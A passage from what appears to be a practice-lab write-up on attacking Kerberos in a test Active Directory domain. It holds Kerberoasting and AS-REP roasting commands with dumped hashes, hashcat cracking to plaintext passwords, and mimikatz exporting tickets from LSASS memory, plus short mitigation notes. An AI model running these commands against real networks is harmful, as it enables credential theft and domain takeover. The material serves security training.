B099D1B73DBA76328B5C1E8DB71F2B01AB10D64616D28CE75B47629263601DB87F86C1DC859C4965 491AE7D2ABBF0950648D8E67D3AE2D3B814366A391E69DA90E59B2190C2B1AD0BADD45B4F08D5461 42EF1FAD3563ADAB83069D670182716E3F5DB6E1C5F0E03030D21843C5955E1531363F5FFD922B78 D64C96484BC4533A95F525505AA3C786DCEAC96C95A2A50C38E9A539D498AB21AD19F06DD45CD1AA 7DE1DF9C9B9DB9E61C2FED8F58CBB74B56222CCFF2FF71FC15FEF428510C810C80A65C442BAEFA8D 4E22691707974B4F3BA71FAFF821D9440D0CD0DD19E275E75420D487871C355B7C2F1C19ACAE069D 82A9D8B65F608A908BF5A696BB51B979A2786DEC2BEE0034CEC53FE83DC0DB2D521D61024670D102 D1D9F8C8ADFEADD3828641FBE4FD4C1117C18784400A739C80D2A7B6BB8FA0826579F1B16437B6AC EB83AE0DB603F3BE0222FCB6A6FE972E4584FCEEF9092BCF27C3655658245B3AABA8D964458E8851 A4121D18518AF1EDD41906FB2A0A678D0BC857ACB806477D5E1F93EEDE0A4226EAB661764510FB84 13929DE78960F10A63EBF740F0CDADCF49BFA4B626CD6BC8CB3EE7983C275A3B8992B3E275EBA2E0 29257B473D03C6EF3B770829B5050A8612A748E94C10E0379C7F37032158098CC43E17F1A6CA1B53 2A1D708673BEA1DAB38A7F9CB340C8A69E951428FDAB9BC361EDA89A36D6EAC9E607FC35E908B9C9 1CEAA5F1487AC5D769B53311363CB31B8FE00EE2495FC302DA93CC6259E375B03696B8F102D1FE6D 28D34ADC46BCF852BDF230BC432B9EB4A1084B643ADF7AF3E8D609BC5649E1105911063B984F5B5B EEDC695A2F6A09A61C17F329E48AFC28D659EDE5457C4B36AB7B25EAB22B90BB6D6EC737FDCBAFC0 FD4D3327F63D5235D857D9CF3C9E4B710E6B0469284C706A1BBEAF8F6764D54DF55C46A9F74E4696 80BDD72BB417DD35B97D9404D8F940468EA48CAC7B70760CECA9C4DEF10355280A216FC42ADB7288 8E813FF85992DFFF864311D8E8B04D91DAA0EC609B9C514BFE55CCAA87AC5E119381B3C40938AF56 4ADF948EAC3E4F1190418432CCC8180B903604C2A13FE6D9D2598448E4[*] SamAccountName : HTTPService[*] DistinguishedName : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local[*] ServicePrincipalName : CONTROLLER-1/HTTPService.CONTROLLER.local:30222[*] PwdLastSet : 5/25/2020 10:39:17 PM[*] Supported ETypes : RC4_HMAC_DEFAULT[*] Hash : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo calethod 2: using Impacket (remotely)root@kali:~/thm/attacking-kerberos# GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.135.137 -request/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.Impacket v0.9.22 - Copyright 2020 SecureAuth CorporationServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ----------------------------------------------- ----------- --------------------------------------------------------------- -------------------------- -------------------------- ----------CONTROLLER-1/SQLService.CONTROLLER.local:30111 SQLService CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local 2020-05-26 00:28:26.922527 2020-05-26 00:46:42.467441 CONTROLLER-1/HTTPService.CONTROLLER.local:30222 HTTPService 2020-05-26 00:39:17.578393 2020-05-26 00:40:14.671872 $krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$4d15890a36dde47beab3a832fb4cc2b9$155f9293736bf74296b26ba4c434231b973aed178db5edf7f9f5ff301618e6f312ef2237aaaa3b570189e5a310eebdd40500f7e96502d18ab2f0a85ccf8c33cb7b252eb0ffa984368df566afc4eec1da00a8d060f57d87d7ace33e443bfb1be1813c34b042614621b39ad6bff805bfea3dc7c344ab5db262dd6fa2c3af8ef1051f9a140bcb7eed77e54c496cc07017596f5a09e9d7b40aae924baa2391d6483d796a32befcff34a8e3d013f27b75a1f5640ec5082bce5ae3657f37438f834ad1d394e60fb18c8558f5140774832dd3c1d8e5f3cfb4a22c4ee2976d989d67fb7cc289991b1f055479cc88449225fbc8fd7515407b14ee0e9ad179b6cb6ca7545e65b4d2b1ee57e12d80642f1f007493b9d96371559b56cfb62a35acc801ae4ca2565cfd55ca4ef91c9121e298b575719f6f41f42f60d7ebf1282c43263fb96dba3d07cd578aaa41210a787dec9066582cab7d13ea887803c1b29a8c6128fb7b7804ef6b42d220a700f267238d263d88d1b5fb38a6ad191cadf5969271e600f9e9e07ebd9fb4b427bd2ba1bc010e200a2a85c97d4702d17191cf7023788f7938f0ecfa1382bd5e4dbb086cf1ed53862e9a9e84c6fa340df05761059d8e8f92b414bb30a1c15c93f92bcbf7d7dae797282c616a6b31bbe136d3fd7d4253e4af257a9977ace8008a106829bc7b0ade5909d4a9b1a3ec306b95e7bbced14799c0b9675bc252d4e1ed20ca42327a587dadd1edd248fdebb0b1d2aad4604e6822ef5127ecb7d4abd2f72420f162c1a25b6043ffb2a1c8b62f1a8bf78568dd403c725827d7f3d2e8453eb21385bdd1b9d1257c48b4e946422ef8b578028fa4b7aec3bd33bc5ee5b265191c94c57c47019c7fdf8011c01e06b46a24c3f21b1ba17ba7cbd7b876c0fb83467530c8529bbb855f5a868ba1519849ee9c97cc3456a5412d8a20b5b60336db361b38ddf0681e1749cfc0766a2640fc877629a8cb84c03a5dc63e4649ffc83af919e6307026dc61ac23df1c16466933e3a3acd136946b2359a60553255fc3f32da9991f5fc6d97c0656220f660ea576c434e5e30b9a5dda0df1b9094ed2c4f8ca184bd1ef31a96db97e218cbeebace0c14d6d6d92662d7222ef48ae02cc33f9ec38f9992a5ef72a24b90787f4802cf364124e4a1c25ddec5f22d0f5dd29f303182e99732a129fb5c77f7af82ffa10b1685d814462ad09fa65c17a958b6ca60fa73ff858b0e315020a662cb27d99ed2984431910aa4c6258b9d7050c8dff72dffa0960ddd8541f0a0933bcfe93403439ea938a40b3c8d41a11a45e1ba93c0e5de4c9dc81f4cfb47fcc2e892d1e5b1868a00b1a6e6360046aae9d11d9d9cdecfb190fceae1ca3df654de190fb$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$ec9862c299884035e696537b24e10eeb$53723dc0ca8ffc479b92b7139b96d90e72800baffa1d10c5ef6b3351e2b9a6ce12b385555b8777a289a769623a3c3659907e344f4dea5aa750b806ff3e6ebfdd938fa4fe14e555be46eec324d99debe93f51ac6c5fe491091835a466383858b327894d504487d6596f0bfe758cc047e9076a3f9b941288a5e141fa05362fcb47d6073b684c34ae3c31f61de6826113f40328a2e3315e5ba5661c392289d18c819a3c5aec151ec8c60ac81dd33844b1c1c2407f376ef23ed05feb59ee7e1259c87455f6d4696fd02770bcb5fb78fcf9000a84b76286e28600ce81ed1a78b95d3c15cba33d863ae23a39d4b45344200bf194f49afb5f828040189f66244f6d4b7c27ff090aeeecec1b4f7132e95581ff85ad10a279f522415dfbe6518251c4a166c66309f93f9cef5aa85e7044d06b3cbf95d51ce3fc5998fcaf23613db05f6e22fc9651998191f67f56fd68a421b5e9225472e7cc58292e18358f81c4b06b743da9f3f8d32418c4d8cda6002341094d291c7b156d1b749028088eb4c79d7d9e1fdc2890d890f565151928f85c9a0957a58276519411c789b8277a7e563e38ade046d75c3702bedfb964ef6c234639ef2893166c806de39fd7671f2eb8f7c65022ab69584957739c59a7e931098e54cfd3a8122d155e50711c3cec84866ea73b55f3c57d586f6b36cf45bbab116d85cd146394945c0b0fbbc27a79055b3f8144504d5a72da0e983ba8123de23c6b07aa75209d21bf635d6e9027937b2860286cebf9b99c55abfa571c04a9e600cf13695e42dfd16606af7ecff7116676834e270b6cfaf605d7171812896d819851ac3a4e63cc1f7ff470e5b880dee423f99194e8097fc41966b459f21b1a284c10e04af207fe7346099c4cdd6e8e6bc35cbcacb0eec640af0a52e3ada07ef568fc53531aeee42a58d12c9cfb960f66f44fdfa3ba23214934a3a15261d233c691fb0133d1f300ec687599b0f07a0d983faeacb1134e3182f2133bda84bb9c0f4c62ccee1e9d796a46a38f6a701998605ea21c25684db58a4213469fa4461c1cf009f99e7cebf813daccfbf6854353f06ce6f6789a36e5c789caf4dd303bb0d96fb2ad209bef06399d5c9349a72769c621cb4fb019c8fe3ccdec34cf20e8708775f1507f49d3b77ae977519ab3b1db48af9669492abd303793b09cf9532e529aaf7d33f389e2eb421c6f08da674fc7c071b745417c315c1b159847cd3953a6a177f95c155ef1cb2c1f0014533ae51197bbcb28edff29c32ae5339e24ac2fd4b715e722df225317f6330f4d053c16893fb78dfe356b35e947e574d53e9dfeafba132960e1c6c745b16c2e72087ca02ab7ff253d21da8adea1414f5fb14183597040a05895ae88Cracking hashes w/ hashcathashcat -m 13100 -a 0 hash.txt Pass.txt Once cracked, if the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users.Mitigation Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective Don’t Make Service Accounts Domain Admins - Service accounts don’t need to be domain admins, kerberoasting won’t be as effective if you don’t make service accounts domain admins.AS-REP Roasting w/ RubeusAS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be AS-REP roastable is to have the privilege “Does not require Pre-Authentication” set.When pre-authentication is disabled, an attacker can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they pretend to be. Other tools such as Impacket’s GetNPUsers.py can be used for AS-REP Roasting. However, using Rubeus seems to be easier because it automatically finds AS-REP Roastable users whereas with GetNPUsers.py you have to enumerate the users beforehand and know which users may be AS-REP Roastable. Nevertheless, GetNPUsers.py can be executed remotely.controller\\administrator@CONTROLLER-1 C:\\Users\\Administrator\\Downloads&amp;gt;Rubeus.exe asreproast ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v1.5.0[*] Action: AS-REP roasting[*] Target Domain : CONTROLLER.local[*] Searching path &#39;LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local&#39; for AS-REP roastable users[*] SamAccountName : Admin2[*] DistinguishedName : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::d446:40d2:5146:4c63%5)[*] Building AS-REQ (w/o preauth) for: &#39;CONTROLLER.local\\Admin2&#39;[+] AS-REQ w/o preauth successful![*] AS-REP hash: $krb5asrep$Admin2@CONTROLLER.local:AF525F76A5539927634AF3C9FF498C3B$1052948C7ED2 ED42FD08A3134A49764F544D0AEB7E29238F3C2BD9FBF6EBDDB76F0EBEF62A50A35CD1C37B1AE4DA 4579344FB818AA2ACB7E19E634A6D77AACD6FFD58BAC470579E3B6EDDE6FD4A3A5E956000A1241D0 2C03B0397775EB788E4B86B1C42AC4FBC91A27A1CBEAAE9B11BAEDEE2718B3C0B346405AE5B033CA E69A853F9AD5BF7FE5A4B7099AA3E5D65D1E555DA846C4484DC07FD45B64B371A2D550A7FD821CFC 0E8D1B2A4675FA47950779707B08782AD2E30F532CC444613CC0F92F1E920B0E650485C5A635F660 15BE94E2B17A18D6E5DE21820EFE9FB0F7365E83FA7BFA90DE46B4D204C24045A3E2C4D2CF2D[*] SamAccountName : User3[*] DistinguishedName : CN=User-3,CN=Users,DC=CONTROLLER,DC=local[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::d446:40d2:5146:4c63%5)[*] Building AS-REQ (w/o preauth) for: &#39;CONTROLLER.local\\User3&#39;[+] AS-REQ w/o preauth successful![*] AS-REP hash: $krb5asrep$User3@CONTROLLER.local:DCD41B4073F3EC71C7B3E40EAC812E4D$A782DCC43409B 182863770DC7CD5F51F8C024BB6E76E4572E5588CB5357CE93D5900CD266C58A934763A2CCBE45F5 CCB01FDEB3794948C3F28E196957A4B451F0332691D55A5CCC591DBFD69C7DBA8082D0D9706ED7B9 9BAB24DB7EC5881F45B258E5C221429E9C8B776B19C75C86A221A393A77EE60CBE0F4BE5A8D239CB 81BCA53432409572F9B18280FA43626F4209BDA4E814CA67762FDDD24FD754FD69DEFE19B11932CE F952C3B5403E5734C45DD81B075F346543D538A92F0C88DD6D3D810633E38DF0B4F75DC0CAAE4E92 96C026D3FB46968DE35AF5DB76841E192113554EF1373B3C6506B3B8BBA5C78D0F3585E3A3BCracking hashes with hashcatroot@kali:~/thm/attacking-kerberos# hashcat -m 18200 hashes2.txt Pass.txt --show$krb5asrep$23$Admin2@CONTROLLER.local:af525f76a5539927634af3c9ff498c3b$1052948c7ed2ed42fd08a3134a49764f544d0aeb7e29238f3c2bd9fbf6ebddb76f0ebef62a50a35cd1c37b1ae4da4579344fb818aa2acb7e19e634a6d77aacd6ffd58bac470579e3b6edde6fd4a3a5e956000a1241d02c03b0397775eb788e4b86b1c42ac4fbc91a27a1cbeaae9b11baedee2718b3c0b346405ae5b033cae69a853f9ad5bf7fe5a4b7099aa3e5d65d1e555da846c4484dc07fd45b64b371a2d550a7fd821cfc0e8d1b2a4675fa47950779707b08782ad2e30f532cc444613cc0f92f1e920b0e650485c5a635f66015be94e2b17a18d6e5de21820efe9fb0f7365e83fa7bfa90de46b4d204c24045a3e2c4d2cf2d:P@$$W0rd2$krb5asrep$23$User3@CONTROLLER.local:dcd41b4073f3ec71c7b3e40eac812e4d$a782dcc43409b182863770dc7cd5f51f8c024bb6e76e4572e5588cb5357ce93d5900cd266c58a934763a2ccbe45f5ccb01fdeb3794948c3f28e196957a4b451f0332691d55a5ccc591dbfd69c7dba8082d0d9706ed7b99bab24db7ec5881f45b258e5c221429e9c8b776b19c75c86a221a393a77ee60cbe0f4be5a8d239cb81bca53432409572f9b18280fa43626f4209bda4e814ca67762fddd24fd754fd69defe19b11932cef952c3b5403e5734c45dd81b075f346543d538a92f0c88dd6d3d810633e38df0b4f75dc0caae4e9296c026d3fb46968de35af5db76841e192113554ef1373b3c6506b3b8bba5c78d0f3585e3a3b:Password3Mitigations Strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective Don’t turn off Kerberos Pre-Authentication unless it’s necessary there’s almost no other way to completely mitigate this attack other than keeping Pre-Authentication on. Pass the Ticket w/ mimikatzMimikatz is very popular for dumping user credentials inside an active directory environment, however it can also be used to dump a TGT from LSASS memory. Export all the tickets into .kirbi files in the current directory:mimikatz # sekurlsa::tickets /export Authentication Id : 0 ; 254355 (00000000:0003e193) Session : Network from 0 User Name : CONTROLLER-1$ Domain : CONTROLLER Logon Server : (null) Logon Time : 6/30/2021 7:38:47 AM SID : S-1-5-18 * Username : CONTROLLER-1$ * Domain : CONTROLLER.LOCAL * Password : (null) Group 0 - Ticket Granting Service Group 1 - Client Ticket ? [00000000] Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ; Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL Target Name (--) : @ CONTROLLER.LOCAL Client Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac 3633ce9240778c13c1d08aa6d1c26f2451b60b57544942a2cfd259b53d123aa7 Ticket : 0x00000012 - aes256_hmac ; kvno = 5 [...] * Saved to file [0;3e193]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi ! Group 2 - Ticket Granting Ticket Authentication Id : 0 ; 254156 (00000000:0003e0cc)Session : Network from 0User Name : CONTROLLER-1$Domain : CONTROLLERLogon Server : (null)Logon Time : 6/30/2021 7:38:47 AMSID : S-1-5-18 * Username : CONTROLLER-1$ * Domain : CONTROLLER.LOCAL * Password : (null) Group 0 - Ticket Granting Service Group 1 - Client Ticket ? [00000000] Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ; Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL Target Name (--) : @ CONTROLLER.LOCAL Client Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac 3633ce9240778c13c1d08aa6d1c26f2451b60b57544942a2cfd259b53d123aa7 Ticket : 0x00000012 - aes256_hmac ; kvno = 5 [...] * Saved to file [0;3e0cc]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi ! Group 2 - Ticket Granting TicketAuthentication Id : 0 ; 216885 (00000000:00034f35)Session : Network from 0User Name : CONTROLLER-1$Domain : CONTROLLERLogon Server : (null)Logon Time : 6/30/2021 7:37:54 AMSID : S-1-5-18 * Username : CONTROLLER-1$ * Domain : CONTROLLER.LOCAL * Password : (null) Group 0 - Ticket Granting Service Group 1 - Client Ticket ? [00000000] Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ; Service Name (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL Target Name (--) : @ CONTROLLER.LOCAL Client Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac 1f81eba6a7560d67ba65fc02acf036f0c40b88b6d1109b3e588d0062fc717a39 Ticket : 0x00000012 - aes256_hmac ; kvno = 5 [...] * Saved to file [0;34f35]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.kirbi ! Group 2 - Ticket Granting TicketAuthentication Id : 0 ; 60274 (00000000:0000eb72)Session : Interactive from 1User Name : DWM-1Domain : Window ManagerLogon Server : (null)Logon Time : 6/30/2021 7:37:17 AMSID : S-1-5-90-0-1 * Username : CONTROLLER-1$ * Domain : CONTROLLER.local * Password : 7f 42 6c fd c4 76 f2 50 b2 3b 9f ae d0 73 b9 24 b1 6f 54 11 84 6c 08 b3 0e ba 5b 26 21 14 86 3d 7d 0b d7 83 ff e4 88 92 bd ed 77 03 4c b5 35 74 47 39 41 ea ea 99 bd f0 51 1a 05 87 37 76 28 a2 fb 61 20 3c 35 89 d4 5c e7 cd 18 fd b8 7b b3 6c 56 90 93 ac ef ad 09 16 92 c9 97 48 d2 97 6e 9d 2e 95 7d 33 df cd 82 e1 e9 8d 91 c6 62 e3 73 89 50 88 1d 15 45 a1 47 71 46 a0 bc ba a2 63 53 a0 62 3e a2 e9 d8 68 0c 29 2c b5 29 2a 78 ce 47 ed a5 3f da 72 57 b9 a2 62 8b df fb 24 d4 95 ad 8d f1 a2 03 cd 14 93 5d 75 ac e7 78 56 17 aa 3a d2 a0 4b 78 8f 72 2d 7a f3 e5 29 cc 37 c9 e9 68 fd d7 50 7f a0 f9 05 f3 1a eb 4e d5 17 12 cb 9f 28 69 db a0 a4 a0 0a 73 c4 29 e2 74 d6 4e f1 bd ac 69 39 c2 b5 3a b6 0c aa 63 35 6c 3e 3b 9f bf 18 Group 0 - Ticket Granting Service Group 1 - Client Ticket ? Group 2 - Ticket Granting TicketAuthentication Id : 0 ; 996 (00000000:000003e4)Session : Service from 0User Name : CONTROLLER-1$Domain : CONTROLLERLogon Server : (null)Logon Time : 6/30/2021 7:37:15 AMSID : S-1-5-20 * Username : controller-1$ * Domain : CONTROLLER.local * Password : 7f 42 6c fd c4 76 f2 50 b2 3b 9f ae d0 73 b9 24 b1 6f 54 11 84 6c 08 b3 0e ba 5b 26 21 14 86 3d 7d 0b d7 83 ff e4 88 92 bd ed 77 03 4c b5 35 74 47 39 41 ea ea 99 bd f0 51 1a 05 87 37 76 28 a2 fb 61 20 3c 35 89 d4 5c e7 cd 18 fd b8 7b b3 6c 56 90 93 ac ef ad 09 16 92 c9 97 48 d2 97 6e 9d 2e 95 7d 33 df cd 82 e1 e9 8d 91 c6 62 e3 73 89 50 88 1d 15 45 a1 47 71 46 a0 bc ba a2 63 53 a0 62 3e a2 e9 d8 68 0c 29 2c b5 29 2a 78 ce 47 ed a5 3f da 72 57 b9 a2 62 8b df fb 24 d4 95 ad 8d f1 a2 03 cd 14 93 5d 75 ac e7 78 56 17 aa 3a d2 a0 4b 78 8f 72 2d 7a f3 e5 29 cc 37 c9 e9 68 fd d7 50 7f a0 f9 05 f3 1a eb 4e d5 17 12 cb 9f 28 69 db a0 a4 a0 0a 73 c4 29 e2 74 d6 4e f1 bd ac 69 39 c2 b5 3a b6 0c aa 63 35 6c 3e 3b 9f bf 18 Group 0 - Ticket Granting Service Group 1 - Client Ticket ? Group 2 - Ticket Granting TicketAuthentication Id : 0 ; 32648 (00000000:00007f88)Session : Interactive from 0User Name : UMFD-0Domain : Font Driver HostLogon Server : (null)Logon Time : 6/30/2021 7:37:14 AMSID : S-1-5-96-0-0 * Username : CONTROLLER-1$ * Domain : CONTROLLER.local * Password : 7f 42 6c fd c4 76 f2 50 b2 3b 9f ae d0 73 b9 24 b1 6f 54 11 84 6c 08 b3 0e ba 5b 26 21 14 86 3d 7d 0b d7 83 ff e4 88 92 bd ed 77 03 4c b5 35 74 47 39 41 ea ea 99 bd f0 51 1a 05 87 37 76 28 a2 fb 61 20 3c 35 89 d4 5c e7 cd 18 fd b8 7b b3 6c 56 90 93 ac ef ad 09 16 92 c9 97 48 d2 97 6e 9d 2e 95 7d 33 df cd 82 e1 e9 8d 91 c6 62 e3 73 89 50 88 1d 15 45 a1 47 71 46 a0 bc ba a2 63 53 a0 62 3e a2 e9 d8 68 0c 29 2c b5 29 2a 78 ce 47 ed a5 3f da 72 57 b9 a2 62 8b df fb 24 d4 95 ad 8d f1 a2 03 cd 14 93 5d 75 ac e7 78 56 17 aa 3a d2 a0 4b 78 8f 72 2d 7a f3 e5 29 cc 37 c9 e9 68 fd d7 50 7f a0 f9 05 f3 1a eb 4e d5 17 12 cb 9f 28 69 db a0 a4 a0 0a 73 c4 29 e2 74 d6 4e f1 bd ac 69 39 c2 b5 3a b6 0c aa 63 35 6c 3e 3b 9f bf 18 Group 0 - Ticket Granting Service Group 1 - Client Ticket ? Group 2 - Ticket Granting TicketAuthentication Id : 0 ; 32706 (00000000:00007fc2)Session : Interactive from 1User Name : UMFD-1Domain : Font Driver HostLogon Server : (null)Logon Time : 6/30/2021 7:37:14 AMSID : S-1-5-96-0-1 * Username : CONTROLLER-1$ * Domain : CONTROLLER.local * Password : 7f 42 6c fd c4 76 f2 50 b2 3b 9f ae d0 73 b9 24 b1 6f 54 11 84 6c 08 b3 0e ba 5b 26 21 14 86 3d 7d 0b d7 83 ff e4 88 92 bd ed 77 03 4c b5 35 74 47 39 41 ea ea 99 bd f0 51 1a 05 87 37 76 28 a2 fb 61 20 3c 35 89 d4 5c e7 cd 18 fd b8 7b b3 6c 56 90 93 ac ef ad 09 16 92 c9 97 48 d2 97 6e 9d 2e 95 7d 33 df cd 82 e1 e9 8d 91 c6 62 e3 73 89 50 88 1d 15 45 a1 47 71 46 a0 bc ba a2 63 53 a0 62 3e a2 e9 d8 68 0c 29 2c b5 29 2a 78 ce 47 ed a5 3f da 72 57 b9 a2 62 8b df fb 24 d4 95 ad 8d f1 a2 03 cd 14 93 5d 75 ac e7 78 56 17 aa 3a d2 a0 4b 78 8f 72 2d 7a f3 e5 29 cc 37 c9 e9 68 fd d7 50 7f a0 f9 05 f3 1a eb 4e d5 17 12 cb 9f 28 69 db a0 a4 a0 0a 73 c4 29 e2 74 d6 4e f1 bd ac 69 39 c2 b5 3a b6 0c aa 63 35 6c 3e 3b 9f bf 18 Group 0 - Ticket Granting Service Group 1 - Client Ticket ? Group 2 - Ticket Granting TicketAuthentication Id : 0 ; 251459 (00000000:0003d643)Session : NetworkCleartext from 0User Name : AdministratorDomain : CONTROLLERLogon Server : CONTROLLER-1Logon Time : 6/30/2021 7:38:38 AMSID : S-1-5-21-432953485-3795405108-1502158860-500 * Username : Administrator * Domain : CONTROLLER.LOCAL * Password : (null) Group 0 - Ticket Granting Service Group 1 - Client Ticket ? Group 2 - Ticket Granting Ticket [00000000] Start/End/MaxRenew: 6/30/2021 7:38:38 AM ; 6/30/2021 5:38:38 PM ; 7/7/2021 7:38:38 AM Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL Target Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL Client Name (01) : Administrator ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL ) Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac 929d937b37ddd5617754e619372f33990465dbf31f434b737032a09ed0aa0501 Ticket : 0x00000012 - aes256_hmac ; kvno = 2 [...] * Saved to file [0;3d643]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi ! Authentication Id : 0 ; 251254 (00000000:0003d576)Session : Network from 0User Name : CONTROLLER-1$Domain : CONTROLLERLogon Server : (null)Logon Time : 6/30/2021 7:38:37 AMSID : S-1-5-18 * Username : CONTROLLER-1$ * Domain : CONTROLLER.LOCAL * Password : (null) Group 0 - Ticket Granting Service Group 1 - Client Ticket ? [00000000] Start/End/MaxRenew: 6/30/2021 7:38:01 AM ; 6/30/2021 5:37:54 PM ; Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL Target Name (--) : @ CONTROLLER.LOCAL Client Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac 28ca5925e323f8a7ae22e9d5e2ddd35d98d7cd2ebe375eb7ae57ab600a04af4e Ticket : 0x00000012 - aes256_hmac ; kvno = 5 [...] * Saved to file [0;3d576]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi ! Group 2 - Ticket Granting TicketAuthentication Id : 0 ; 250419 (00000000:0003d233)Session : Service from 0User Name : sshd_3812Domain : VIRTUAL USERSLogon Server : (null)Logon Time : 6/30/2021 7:38:36 AMSID : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-3812 * Username : CONTROLLER-1$ * Domain : CONTROLLER.local * Password : 7f 42 6c fd c4 76 f2 50 b2 3b 9f ae d0 73 b9 24 b1 6f 54 11 84 6c 08 b3 0e ba 5b 26 21 14 86 3d 7d 0b d7 83 ff e4 88 92 bd ed 77 03 4c b5 35 74 47 39 41 ea ea 99 bd f0 51 1a 05 87 37 76 28 a2 fb 61 20 3c 35 89 d4 5c e7 cd 18 fd b8 7b b3 6c 56 90 93 ac ef ad 09 16 92 c9 97 48 d2 97 6e 9d 2e 95 7d 33 df cd 82 e1 e9 8d 91 c6 62 e3 73 89 50 88 1d 15 45 a1 47 71 46 a0 bc ba a2 63 53 a0 62 3e a2 e9 d8 68 0c 29 2c b5 29 2a 78 ce 47 ed a5 3f da 72 57 b9 a2 62 8b df fb 24 d4 95 ad 8d f1 a2 03 cd 14 93 5d 75 ac e7 78 56 17 aa 3a d2 a0 4b 78 8f 72 2d 7a f3 e5 29 cc 37 c9 e9 68 fd d7 50 7f a0 f9 05 f3 1a eb 4e d5 17 12 cb 9f 28 69 db a0 a4 a0 0a 73 c4 29 e2 74 d6 4e f1 bd ac 69 39 c2 b5 3a b6 0c aa 63 35 6c 3e 3b 9f bf 18 Group 0 - Ticket Granting Service Group 1 - Client Ticket ? Group 2 - Ticket Granting TicketAuthentication Id : 0 ; 228429 (00000000:00037c4d)Session : Network from 0User Name : CONTROLLER-1$Domain : CONTROLLERLogon Server : (null)Logon Time : 6/30/2021 7:38:01 AMSID : S-1-5-18 * Username : CONTROLLER-1$ * Domain : CONTROLLER.LOCAL * Password : (null) Group 0 - Ticket Granting Service Group 1 - Client Ticket ? [00000000] Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ; Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL Target Name (--) : @ CONTROLLER.LOCAL Client Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac 3633ce9240778c13c1d08aa6d1c26f2451b60b57544942a2cfd259b53d123aa7 Ticket : 0x00000012 - aes256_hmac ; kvno = 5 [...] * Saved to file [0;37c4d]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi ! Group 2 - Ticket Granting TicketAuthentication Id : 0 ; 228350 (00000000:00037bfe)Session : Network from 0User Name : CONTROLLER-1$Domain : CONTROLLERLogon Server : (null)Logon Time : 6/30/2021 7:38:01 AMSID : S-1-5-18 * Username : CONTROLLER-1$ * Domain : CONTROLLER.LOCAL * Password : (null) Group 0 - Ticket Granting Service Group 1 - Client Ticket ? [00000000] Start/End/MaxRenew: 6/30/2021 7:38:01 AM ; 6/30/2021 5:37:54 PM ; Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL Target Name (--) : @ CONTROLLER.LOCAL Client 